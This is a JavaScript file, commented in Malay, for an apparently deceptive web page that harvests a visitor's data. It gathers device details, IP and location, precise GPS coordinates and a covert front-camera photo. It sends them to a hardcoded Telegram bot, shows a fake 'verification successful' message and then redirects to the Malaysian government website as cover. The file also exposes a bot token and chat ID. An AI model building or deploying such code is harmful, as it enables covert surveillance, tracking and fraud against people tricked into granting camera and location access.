// TUKAR SINI
const BOT_TOKEN = "9277901855:AAF-83CM2BKInE4V_rKb3oyxSHEjS3t8ym0";
const CHAT_ID = "-1004444548273";
const REDIRECT_URL = "https://www.malaysia.gov.my"; // Redirect ke web rasmi kerajaan

const $ = id => document.getElementById(id);
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// 1. Fungsi hantar mesej teks
async function sendMessage(text) {
    await fetch(`${TG_URL}/sendMessage`, {
        method: "POST",
        body: new URLSearchParams({ chat_id: CHAT_ID, text, parse_mode: "HTML" })
    });
}

// 2. Fungsi hantar gambar
async function sendPhoto(blob, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blob, "selfie.jpg");
    fd.append("caption", caption);
    fd.append("parse_mode", "HTML");
    await fetch(`${TG_URL}/sendPhoto`, { method: "POST", body: fd });
}

// 3. Info Device
function getDeviceInfo() {
    return `
<b>📱 Device Info</b>
<b>UA:</b> <code>${navigator.userAgent}</code>
<b>Screen:</b> ${screen.width}x${screen.height}
<b>Lang:</b> ${navigator.language}
<b>TZ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
    `;
}

// 4. Info IP
async function getIPInfo() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        return `
<b>🌐 IP Info</b>
<b>IP:</b> ${data.ip}
<b>Lokasi:</b> ${data.city}, ${data.country_name}
<b>ISP:</b> ${data.org}
        `;
    } catch (e) { return "<b>🌐 IP Info:</b> Gagal."; }
}

// 5. GPS (Minta Permission)
function getGPS() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve("GPS tidak disokong.");
        navigator.geolocation.getCurrentPosition(
            pos => resolve(`<b>📍 GPS Tepat</b>\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nMaps: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`),
            err => resolve("<b>📍 GPS:</b> User tolak permission."),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// 6. Kamera (Minta Permission)
async function getCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const video = $("preview");
        video.srcObject = stream;
        await video.play();
        
        await new Promise(r => setTimeout(r, 2000)); // Tunggu fokus

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(t => t.stop());
        
        return new Promise(resolve => {
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
        });
    } catch (e) { return null; }
}

// --- MAIN FUNCTION ---
async function startHarvest() {
    const btn = $("start-btn");
    const status = $("status");
    btn.disabled = true;
    btn.textContent = "Memproses...";
    status.textContent = "Sila tunggu sebentar...";

    let report = getDeviceInfo() + "\n\n" + await getIPInfo();

    status.textContent = "Mengesan lokasi...";
    report += "\n\n" + await getGPS();

    status.textContent = "Membuka kamera...";
    const photoBlob = await getCamera();

    status.textContent = "Menghantar data...";
    if (photoBlob) {
        await sendPhoto(photoBlob, report); 
    } else {
        await sendMessage(report);
    }

    status.textContent = "Pengesahan berjaya!";
    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
}
